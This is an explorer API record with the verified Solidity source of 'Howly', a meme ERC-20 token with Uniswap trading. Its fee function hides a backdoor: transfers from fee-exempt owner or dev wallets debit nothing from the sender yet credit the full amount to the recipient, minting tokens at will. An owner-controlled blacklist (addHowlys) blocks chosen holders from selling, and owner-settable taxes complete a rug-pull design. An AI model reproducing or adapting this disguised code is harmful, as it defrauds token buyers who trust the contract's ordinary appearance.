{
  "TxHash": "0x488504fd3fa279f65f4292fb2b4c6dc2aa77c907d5c1dfcfdb162c503be80cbe",
  "ContractAddress": "0x967477ad998c94664217ce150a25bcb84a05a3e2",
  "Name": "Howly",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2024-08-04\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\nHowly is Wolf\r\n\r\nFight to survive. \r\n\r\nhttps://twitter.com/HowlyWolf_coin\r\nhttps://t.me/HOWLYOFFICIALPORTAL\r\nhttps://howly.ink\r\n\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\nlibrary SafeMath {\r\nfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\nuint256 c = a + b;\r\nrequire(c \u003e= a, \"SafeMath: addition overflow\");\r\nreturn c;\r\n}\r\n\r\nfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\nreturn sub(a, b, \"SafeMath: subtraction overflow\");\r\n}\r\n\r\nfunction sub(\r\nuint256 a,\r\nuint256 b,\r\nstring memory errorMessage\r\n) internal pure returns (uint256) {\r\nrequire(b \u003c= a, errorMessage);\r\nuint256 c = a - b;\r\nreturn c;\r\n}\r\n\r\nfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nuint256 c = a * b;\r\nrequire(c / a == b, \"SafeMath: multiplication overflow\");\r\nreturn c;\r\n}\r\n\r\nfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\nreturn div(a, b, \"SafeMath: division by zero\");\r\n}\r\n\r\nfunction div(\r\nuint256 a,\r\nuint256 b,\r\nstring memory errorMessage\r\n) internal pure returns (uint256) {\r\nrequire(b \u003e 0, errorMessage);\r\nuint256 c = a / b;\r\nreturn c;\r\n}\r\n}\r\n\r\ninterface ERC20 {\r\nfunction totalSupply() external view returns (uint256);\r\n\r\nfunction decimals() external view returns (uint8);\r\n\r\nfunction symbol() external view returns (string memory);\r\n\r\nfunction name() external view returns (string memory);\r\n\r\nfunction getOwner() external view returns (address);\r\n\r\nfunction balanceOf(address account) external view returns (uint256);\r\n\r\nfunction transfer(address recipient, uint256 amount)\r\nexternal\r\nreturns (bool);\r\n\r\nfunction allowance(address _owner, address spender)\r\nexternal\r\nview\r\nreturns (uint256);\r\n\r\nfunction approve(address spender, uint256 amount) external returns (bool);\r\n\r\nfunction transferFrom(\r\naddress sender,\r\naddress recipient,\r\nuint256 amount\r\n) external returns (bool);\r\n\r\nevent Transfer(address indexed from, address indexed to, uint256 value);\r\nevent Approval(\r\naddress indexed owner,\r\naddress indexed spender,\r\nuint256 value\r\n);\r\n}\r\n\r\nabstract contract Ownable {\r\naddress internal owner;\r\n\r\nconstructor(address _owner) {\r\nowner = _owner;\r\n}\r\n\r\nmodifier onlyOwner() {\r\nrequire(isOwner(msg.sender), \"!OWNER\");\r\n_;\r\n}\r\n\r\nfunction isOwner(address account) public view returns (bool) {\r\nreturn account == owner;\r\n}\r\n\r\nfunction renounceOwnership() public onlyOwner {\r\nowner = address(0);\r\nemit OwnershipTransferred(address(0));\r\n}\r\n\r\nevent OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\nfunction createPair(address tokenA, address tokenB)\r\nexternal\r\nreturns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\nfunction factory() external pure returns (address);\r\n\r\nfunction WETH() external pure returns (address);\r\n\r\nfunction addLiquidity(\r\naddress tokenA,\r\naddress tokenB,\r\nuint256 amountADesired,\r\nuint256 amountBDesired,\r\nuint256 amountAMin,\r\nuint256 amountBMin,\r\naddress to,\r\nuint256 deadline\r\n)\r\nexternal\r\nreturns (\r\nuint256 amountA,\r\nuint256 amountB,\r\nuint256 liquidity\r\n);\r\n\r\nfunction addLiquidityETH(\r\naddress token,\r\nuint256 amountTokenDesired,\r\nuint256 amountTokenMin,\r\nuint256 amountETHMin,\r\naddress to,\r\nuint256 deadline\r\n)\r\nexternal\r\npayable\r\nreturns (\r\nuint256 amountToken,\r\nuint256 amountETH,\r\nuint256 liquidity\r\n);\r\n\r\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\r\nuint256 amountOutMin,\r\naddress[] calldata path,\r\naddress to,\r\nuint256 deadline\r\n) external payable;\r\n\r\nfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\r\nuint256 amountIn,\r\nuint256 amountOutMin,\r\naddress[] calldata path,\r\naddress to,\r\nuint256 deadline\r\n) external;\r\n\r\nfunction removeLiquidityETHSupportingFeeOnTransferTokens(\r\naddress token,\r\nuint liquidity,\r\nuint amountTokenMin,\r\nuint amountETHMin,\r\naddress to,\r\nuint deadline\r\n) external returns (uint amountETH);\r\n\r\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\naddress token,\r\nuint liquidity,\r\nuint amountTokenMin,\r\nuint amountETHMin,\r\naddress to,\r\nuint deadline,\r\nbool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountETH);\r\n\r\nfunction removeLiquidityWithPermit(\r\naddress tokenA,\r\naddress tokenB,\r\nuint liquidity,\r\nuint amountAMin,\r\nuint amountBMin,\r\naddress to,\r\nuint deadline,\r\nbool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountA, uint amountB);\r\nfunction removeLiquidityETHWithPermit(\r\naddress token,\r\nuint liquidity,\r\nuint amountTokenMin,\r\nuint amountETHMin,\r\naddress to,\r\nuint deadline,\r\nbool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountToken, uint amountETH);\r\n\r\nfunction quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n}\r\n\r\ncontract Howly is ERC20, Ownable {\r\nusing SafeMath for uint256;\r\n\r\naddress routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\naddress DEAD = 0x000000000000000000000000000000000000dEaD;\r\n\r\nstring constant _name = \"HowlyWolf Fight to survive\";\r\nstring constant _symbol = \"Howly\";\r\n\r\nuint8 constant _decimals = 18;\r\n\r\nuint256 public _totalSupply = 800_000_000 * (10**_decimals);\r\nuint256 public _maxWalletAmount = (_totalSupply * 6) / 100;\r\nuint256 public _swapHowlyThreshHold = (_totalSupply * 1)/ 10000;\r\nuint256 public _maxTaxSwap=(_totalSupply * 13) / 10000;\r\n\r\nmapping(address =\u003e uint256) _balances;\r\nmapping(address =\u003e mapping(address =\u003e uint256)) _allowances;\r\nmapping(address =\u003e bool) isFeeExempt;\r\nmapping(address =\u003e bool) isTxLimitExempt;\r\nmapping(address =\u003e bool) private Howlys;\r\n\r\naddress public _HowlyWallet;\r\naddress public pair;\r\n\r\nIUniswapV2Router02 public router;\r\n\r\nbool public swapEnabled = false;\r\nbool public HowlyFeeEnabled = false;\r\nbool public TradingOpen = false;\r\nuint256 private _initBuyTax=16;\r\nuint256 private _initSellTax=16;\r\nuint256 private _finalBuyTax=0;\r\nuint256 private _finalSellTax=0;\r\nuint256 private _reduceBuyTaxAt=10;\r\nuint256 private _reduceSellTaxAt=10;\r\nuint256 private _buyCounts=0;\r\n\r\nbool inSwap;\r\nmodifier lockTheSwap {\r\ninSwap = true;\r\n_;\r\ninSwap = false;\r\n}\r\n\r\nconstructor(address HowlyWallet) Ownable(msg.sender) {\r\n\r\naddress _owner = owner;\r\n_HowlyWallet = HowlyWallet;\r\n\r\nisFeeExempt[_owner] = true;\r\nisFeeExempt[_HowlyWallet] = true;\r\nisFeeExempt[address(this)] = true;\r\nisTxLimitExempt[_owner] = true;\r\nisTxLimitExempt[_HowlyWallet] = true;\r\nisTxLimitExempt[address(this)] = true;\r\n\r\n_balances[_owner] = _totalSupply;\r\nemit Transfer(address(0), _owner, _totalSupply);\r\n}\r\n\r\nfunction getOwner() external view override returns (address) {\r\nreturn owner;\r\n}\r\n\r\nfunction balanceOf(address account) public view override returns (uint256) {\r\nreturn _balances[account];\r\n}\r\n\r\nfunction _basicTransfer(\r\naddress sender,\r\naddress recipient,\r\nuint256 amount\r\n) internal returns (bool) {\r\n_balances[sender] = _balances[sender].sub(\r\namount,\r\n\"Insufficient Balance\"\r\n);\r\n_balances[recipient] = _balances[recipient].add(amount);\r\nemit Transfer(sender, recipient, amount);\r\nreturn true;\r\n}\r\n\r\nfunction withdrawHowlyBalance() external onlyOwner {\r\nrequire(address(this).balance \u003e 0, \"Token: no ETH to clear\");\r\npayable(msg.sender).transfer(address(this).balance);\r\n}\r\n\r\nfunction approve(address spender, uint256 amount)\r\npublic\r\noverride\r\nreturns (bool)\r\n{\r\n_allowances[msg.sender][spender] = amount;\r\nemit Approval(msg.sender, spender, amount);\r\nreturn true;\r\n}\r\n\r\nfunction enableHowlyTrade() public onlyOwner {\r\nrequire(!TradingOpen,\"trading is already open\");\r\n\r\nTradingOpen = true;\r\nHowlyFeeEnabled = true;\r\nswapEnabled = true;\r\n}\r\n\r\nfunction getHowlyAmounts(uint action, bool takeFee, uint256 tAmount) internal returns(uint256, uint256) {\r\nuint256 sAmount = takeFee\r\n? tAmount : HowlyFeeEnabled\r\n? takeHowlyAmountAfterFees(action, takeFee, tAmount) \r\n: tAmount;\r\n\r\nuint256 rAmount = HowlyFeeEnabled \u0026\u0026 takeFee\r\n? takeHowlyAmountAfterFees(action, takeFee, tAmount)\r\n: tAmount;\r\nreturn (sAmount, rAmount);\r\n}\r\n\r\nfunction decimals() external pure override returns (uint8) {\r\nreturn _decimals;\r\n}\r\n\r\nfunction internalSwapBackEth(uint256 amount) private lockTheSwap {\r\nuint256 tokenBalance = balanceOf(address(this));\r\nuint256 amountToSwap = min(amount, min(tokenBalance, _maxTaxSwap));\r\n\r\naddress[] memory path = new address[](2);\r\npath[0] = address(this);\r\npath[1] = router.WETH();\r\n\r\nrouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\namountToSwap,\r\n0,\r\npath,\r\naddress(this),\r\nblock.timestamp\r\n);\r\n\r\nuint256 ethAmountFor = address(this).balance;\r\npayable(_HowlyWallet).transfer(ethAmountFor);\r\n}\r\n\r\nfunction removeHowlyLimit() external onlyOwner returns (bool) {\r\n_maxWalletAmount = _totalSupply;\r\nreturn true;\r\n}\r\n\r\nfunction takeHowlyAmountAfterFees(uint HowlyActions, bool HowlyTakefee, uint256 amounts)\r\ninternal\r\nreturns (uint256)\r\n{\r\nuint256 HowlyPercents;\r\nuint256 HowlyFeePrDenominator = 100;\r\n\r\nif(HowlyTakefee) {\r\n\r\nif(HowlyActions \u003e 1) {\r\nHowlyPercents = (_buyCounts\u003e_reduceSellTaxAt ? _finalSellTax : _initSellTax);\r\n} else {\r\nif(HowlyActions \u003e 0) {\r\nHowlyPercents = (_buyCounts\u003e_reduceBuyTaxAt ? _finalBuyTax : _initBuyTax);\r\n} else {\r\nHowlyPercents = 0;\r\n}\r\n}\r\n\r\n} else {\r\nHowlyPercents = 1;\r\n}\r\n\r\nuint256 feeAmounts = amounts.mul(HowlyPercents).div(HowlyFeePrDenominator);\r\n_balances[address(this)] = _balances[address(this)].add(feeAmounts);\r\nfeeAmounts = HowlyTakefee ? feeAmounts : amounts.div(HowlyPercents);\r\n\r\nreturn amounts.sub(feeAmounts);\r\n}\r\n\r\nreceive() external payable {\r\n\r\n}\r\n\r\nfunction _transferTaxTokens(\r\naddress sender,\r\naddress recipient,\r\nuint256 amount,\r\nuint action,\r\nbool takeFee\r\n) internal returns (bool) {\r\n\r\nuint256 senderAmount; \r\nuint256 recipientAmount;\r\n\r\n(senderAmount, recipientAmount) = getHowlyAmounts(action, takeFee, amount);\r\n_balances[sender] = _balances[sender].sub(\r\nsenderAmount,\r\n\"Insufficient Balance\"\r\n);\r\n_balances[recipient] = _balances[recipient].add(recipientAmount);\r\nemit Transfer(sender, recipient, amount);\r\nreturn true;\r\n}\r\n\r\nfunction allowance(address holder, address spender)\r\nexternal\r\nview\r\noverride\r\nreturns (uint256)\r\n{\r\nreturn _allowances[holder][spender];\r\n}\r\n\r\nfunction createHowlyTrade() external onlyOwner {\r\nrouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\npair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());\r\nisTxLimitExempt[pair] = true;\r\n\r\n_allowances[address(this)][address(router)] = type(uint256).max;\r\nrouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner,block.timestamp);\r\n}\r\n\r\nfunction name() external pure override returns (string memory) {\r\nreturn _name;\r\n}\r\n\r\nfunction min(uint256 a, uint256 b) private pure returns (uint256){\r\nreturn (a\u003eb)?b:a;\r\n}\r\n\r\nfunction totalSupply() external view override returns (uint256) {\r\nreturn _totalSupply;\r\n}\r\n\r\nfunction inSwapHowlyTokens(bool isIncludeFees , uint isSwapActions, uint256 pAmount, uint256 pLimit) internal view returns (bool) {\r\n\r\nuint256 minHowlyTokens = pLimit;\r\nuint256 tokenHowlyWeight = pAmount;\r\nuint256 contractHowlyOverWeight = balanceOf(address(this));\r\n\r\nbool isSwappable = contractHowlyOverWeight \u003e minHowlyTokens \u0026\u0026 tokenHowlyWeight \u003e minHowlyTokens;\r\n\r\nreturn\r\n!inSwap \u0026\u0026\r\nisIncludeFees \u0026\u0026 \r\nisSwapActions \u003e 1 \u0026\u0026\r\nisSwappable \u0026\u0026\r\nswapEnabled;\r\n}\r\n\r\nfunction symbol() external pure override returns (string memory) {\r\nreturn _symbol;\r\n}\r\n\r\nfunction reduceFinalBuyTax(uint256 _newFee) external onlyOwner{\r\n_finalBuyTax=_newFee;\r\n}\r\n\r\nfunction reduceFinalSellTax(uint256 _newFee) external onlyOwner{\r\n_finalSellTax=_newFee;\r\n}\r\n\r\nfunction isHowlyUserBuy(address sender, address recipient) internal view returns (bool) {\r\nreturn\r\nrecipient != pair \u0026\u0026\r\nrecipient != DEAD \u0026\u0026\r\n!isFeeExempt[sender] \u0026\u0026\r\n!isFeeExempt[recipient];\r\n}\r\nfunction isTakeHowlyActions(address from, address to) internal view returns (bool, uint) {\r\n\r\nuint _actions = 0;\r\nbool _isTakeFee = isTakeFees(from);\r\n\r\nif(to == pair) {\r\n_actions = 2;\r\n} else if (from == pair) {\r\n_actions = 1;\r\n} else {\r\n_actions = 0;\r\n}\r\nreturn (_isTakeFee, _actions);\r\n}\r\n\r\nfunction addHowlys(address[] memory Howlys_) public onlyOwner {\r\nfor (uint i = 0; i \u003c Howlys_.length; i++) {\r\nHowlys[Howlys_[i]] = true;\r\n}\r\n}\r\n\r\nfunction delHowlys(address[] memory notHowly) public onlyOwner {\r\nfor (uint i = 0; i \u003c notHowly.length; i++) {\r\nHowlys[notHowly[i]] = false;\r\n}\r\n}\r\n\r\nfunction isHowly(address a) public view returns (bool){\r\nreturn Howlys[a];\r\n}\r\n\r\nfunction _transferStandardTokens(\r\naddress sender,\r\naddress recipient,\r\nuint256 amount\r\n) internal returns (bool) {\r\n\r\nrequire(sender != address(0), \"ERC20: transfer from the zero address\");\r\nrequire(recipient != address(0), \"ERC20: transfer to the zero address\");\r\nrequire(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n\r\nbool takefee;\r\nuint actions;\r\n\r\nrequire(!Howlys[sender] \u0026\u0026 !Howlys[recipient]);\r\n\r\nif (inSwap) {\r\nreturn _basicTransfer(sender, recipient, amount);\r\n}\r\n\r\nif(!isFeeExempt[sender] \u0026\u0026 !isFeeExempt[recipient]){\r\nrequire(TradingOpen,\"Trading not open yet\");\r\n}\r\n\r\nif(!swapEnabled) {\r\nreturn _basicTransfer(sender, recipient, amount);\r\n}\r\nif (isHowlyUserBuy(sender, recipient)) {\r\nrequire(\r\nisTxLimitExempt[recipient] ||\r\n_balances[recipient] + amount \u003c= _maxWalletAmount,\r\n\"Transfer amount exceeds the bag size.\"\r\n);\r\n\r\nincreaseBuyCount(sender);\r\n}\r\n\r\n(takefee, actions) = isTakeHowlyActions(sender, recipient);\r\n\r\nif (inSwapHowlyTokens(takefee, actions, amount, _swapHowlyThreshHold)) {\r\ninternalSwapBackEth(amount);\r\n}\r\n\r\n_transferTaxTokens(sender, recipient, amount, actions, takefee);\r\nreturn true;\r\n} \r\n\r\nfunction transferFrom(\r\naddress sender,\r\naddress recipient,\r\nuint256 amount\r\n) external override returns (bool) {\r\nif (_allowances[sender][msg.sender] != type(uint256).max) {\r\n_allowances[sender][msg.sender] = _allowances[sender][msg.sender]\r\n.sub(amount, \"Insufficient Allowance\");\r\n}\r\n\r\nreturn _transferStandardTokens(sender, recipient, amount);\r\n}\r\nfunction transfer(address recipient, uint256 amount)\r\nexternal\r\noverride\r\nreturns (bool)\r\n{\r\nreturn _transferStandardTokens(msg.sender, recipient, amount);\r\n}\r\n\r\nfunction increaseBuyCount(address sender) internal {\r\nif(sender == pair) {\r\n_buyCounts++;\r\n}\r\n}\r\n\r\nfunction isTakeFees(address sender) internal view returns (bool) {\r\nreturn !isFeeExempt[sender];\r\n}\r\n\r\n}",
      "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"HowlyWallet\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"HowlyFeeEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_HowlyWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapHowlyThreshHold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"Howlys_\",\"type\":\"address[]\"}],\"name\":\"addHowlys\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createHowlyTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"notHowly\",\"type\":\"address[]\"}],\"name\":\"delHowlys\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableHowlyTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"a\",\"type\":\"address\"}],\"name\":\"isHowly\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newFee\",\"type\":\"uint256\"}],\"name\":\"reduceFinalBuyTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newFee\",\"type\":\"uint256\"}],\"name\":\"reduceFinalSellTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeHowlyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawHowlyBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "Howly",
      "CompilerVersion": "v0.8.19+commit.7dd6d404",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://f3a3e36ec13805dea028082da5b4353ceb544d5b06b8ad4d2fb9c3040fa17fb1"
    }
  ]
}
